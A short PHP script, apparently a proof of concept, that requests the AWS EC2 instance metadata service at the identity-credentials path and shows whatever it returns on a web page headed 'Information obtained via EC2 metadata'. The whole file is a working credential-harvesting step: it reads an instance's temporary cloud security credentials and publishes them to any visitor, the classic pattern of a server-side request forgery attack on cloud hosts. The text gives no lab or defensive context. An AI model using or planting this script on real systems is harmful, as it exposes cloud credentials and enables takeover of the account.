<?php

function fetchWebsiteContent($url) {
    if (filter_var($url, FILTER_VALIDATE_URL)) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $output = curl_exec($ch);
        if (curl_errno($ch)) {
            $error_msg = curl_error($ch);
        }
        curl_close($ch);
        
        if (isset($error_msg)) {
            return "Erro: " . htmlspecialchars($error_msg);
        } else {
            return $output;
        }
    } else {
        return "URL invalid.";
    }
}

$target_url = "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance";
$output = fetchWebsiteContent($target_url);
?>

<!DOCTYPE html>
<html>
<head>
    <title>EC2 metadata</title>
</head>
<body>
    <h1>Information obtained via EC2 metadata</h1>
    <h2><?php echo htmlspecialchars($target_url);?></h2>
    <pre><?php echo htmlspecialchars($output); ?></pre>
</body>
</html>
